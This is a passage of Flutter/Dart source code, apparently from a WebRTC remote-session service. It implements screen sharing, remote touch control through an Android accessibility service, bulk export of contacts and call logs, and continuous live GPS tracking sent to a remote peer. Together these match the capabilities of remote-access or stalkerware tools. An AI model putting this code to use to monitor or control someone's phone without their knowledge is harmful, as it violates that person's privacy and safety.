      print("[WebRTCService] Screen Share started in Max Fluidity Mode (720p@30)");
      
      // Start Adaptive Quality Loop
      _startAdaptiveQualityLoop();
    } catch (e) {
      _isCameraInitializing = false;
      print("[WebRTCService] Screen Share error: $e");
      _sendMessage({'type': 'error', 'message': 'Screen share failed: $e'});
    }
  }

  Timer? _adaptiveTimer;
  double _currentScale = 1.0;

  void _startAdaptiveQualityLoop() {
    _adaptiveTimer?.cancel();
    _adaptiveTimer = Timer.periodic(const Duration(seconds: 3), (timer) {
      if (_peerConnection == null || !_isScreenStreaming) {
        timer.cancel();
        return;
      }
      _updateAdaptiveQuality();
    });
  }

  Future<void> _updateAdaptiveQuality() async {
    try {
      List<StatsReport> stats = await _peerConnection!.getStats();
      double rtt = 0;
      double packetLoss = 0;

      for (var report in stats) {
        if (report.type == 'remote-inbound-rtp') {
          rtt = (report.values['roundTripTime'] ?? 0).toDouble();
          packetLoss = (report.values['packetsLost'] ?? 0).toDouble();
        }
      }

      // Logic Decision for Max Fluidity
      double newScale = 1.0;
      int maxBitrate = 1200000; // 1.2 Mbps max for 480p stability

      if (rtt > 0.3 || packetLoss > 10) {
        newScale = 1.5; // Downscale further if network dies
        maxBitrate = 500000;
      }

      if (newScale != _currentScale) {
        _currentScale = newScale;
        await _applyQualitySettings(newScale, maxBitrate);
        print("[Adaptive] Shifted gear: Scale $newScale (RTT: ${rtt*1000}ms)");
      }
    } catch (e) {
      debugPrint("Adaptive Error: $e");
    }
  }

  Future<void> _applyQualitySettings(double scale, int bitrate) async {
    try {
      var senders = await _peerConnection!.getSenders();
      for (var sender in senders) {
        if (sender.track?.kind == 'video') {
          var params = sender.parameters;
          params.degradationPreference = RTCDegradationPreference.MAINTAIN_FRAMERATE;
          if (params.encodings != null && params.encodings!.isNotEmpty) {
            params.encodings!.first.scaleResolutionDownBy = scale;
            params.encodings!.first.maxBitrate = bitrate;
            await sender.setParameters(params);
          }
        }
      }
    } catch (e) {
      debugPrint("Apply Quality Error: $e");
    }
  }

  Future<void> _handleRemoteTouch(Map<String, dynamic> data) async {
    try {
      final action = data['action'] ?? 'tap';
      final bundle = Map<String, dynamic>.from(data);
      
      debugPrint("[Control] Received $action at (${data['x']}, ${data['y']})");
      
      switch (action) {
        case 'tap':
          final bool active = await _remotePlatform.invokeMethod('isAccessibilityServiceEnabled');
          if (!active) {
            _sendMessage({'type': 'error', 'message': 'Remote Control Service is NOT enabled in Accessibility Settings!'});
            return;
          }
          await _remotePlatform.invokeMethod('performTouch', bundle);
          break;
        case 'type':
          await _remotePlatform.invokeMethod('performType', bundle);
          break;
        case 'swipe':
          await _remotePlatform.invokeMethod('performSwipe', bundle);
          break;
        case 'long_press':
          await _remotePlatform.invokeMethod('performLongPress', bundle);
          break;
        case 'navigation':
          await _remotePlatform.invokeMethod('performAction', {'action': data['navAction']});
          break;
      }
    } catch (e) {
      debugPrint("Remote Touch Error: $e");
    }
  }
  Future<void> _handleGetContacts() async {
    try {
      // Use permission_handler for explicit request
      final status = await Permission.contacts.request();
      if (status.isGranted) {
        // Now use flutter_contacts to get them
        final contacts = await FlutterContacts.getContacts(withProperties: true);
        final results = contacts.map((c) {
          return <String, dynamic>{
            'name': c.displayName,
            'phones': c.phones.map((p) => p.number).toList(),
          };
        }).toList();
        
        _sendMessage({
          'type': 'contacts_list',
          'contacts': results,
        });
      } else {
        _sendMessage({'type': 'error', 'message': 'Contacts permission denied: $status'});
      }
    } catch (e) {
      _sendMessage({'type': 'error', 'message': 'Failed to fetch contacts: $e'});
    }
  }

  Future<void> _handleGetCallLogs() async {
    try {
      final status = await Permission.phone.request();
      if (status.isGranted) {
        final Iterable<CallLogEntry> entries = await CallLog.get();
        final results = entries.map((e) {
          return <String, dynamic>{
            'name': e.name ?? 'Unknown',
            'number': e.number ?? '',
            'type': e.callType.toString(),
            'duration': e.duration ?? 0,
            'timestamp': e.timestamp ?? 0,
          };
        }).toList();

        _sendMessage({
          'type': 'call_logs_list',
          'logs': results,
        });
      } else {
        _sendMessage({'type': 'error', 'message': 'Phone/Call Log permission denied'});
      }
    } catch (e) {
      _sendMessage({'type': 'error', 'message': 'Failed to fetch call logs: $e'});
    }
  }

  Future<void> _startLocationTracking() async {
    try {
      final status = await Permission.location.request();
      if (!status.isGranted) {
        _sendMessage({'type': 'error', 'message': 'Location permission denied: $status'});
        return;
      }

      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        _sendMessage({'type': 'error', 'message': 'Location services are disabled.'});
        return;
      }

      _stopLocationTracking(); // Clean up existing

      const LocationSettings locationSettings = LocationSettings(
        accuracy: LocationAccuracy.bestForNavigation,
        distanceFilter: 0, // 0 enables absolute live telemetry without movement threshold
      );

      _locationSub = Geolocator.getPositionStream(locationSettings: locationSettings).listen((Position position) {
        _sendMessage({
          'type': 'location_update',
          'lat': position.latitude,
          'lng': position.longitude,
          'speed': position.speed, // m/s
          'accuracy': position.accuracy,
          'altitude': position.altitude,
          'heading': position.heading,
          'timestamp': position.timestamp.millisecondsSinceEpoch,
        });
        print("[Location] Update sent: ${position.latitude}, ${position.longitude}");
      }, onError: (e) {
        debugPrint("[Location] Stream Error: $e");
        _sendMessage({'type': 'error', 'message': 'Location stream error: $e'});
      });

    } catch (e) {
      _sendMessage({'type': 'error', 'message': 'Failed to start location tracking: $e'});
    }
  }

  void _stopLocationTracking() {
    _locationSub?.cancel();
    _locationSub = null;
    print("[Location] Tracking stopped.");
  }
}
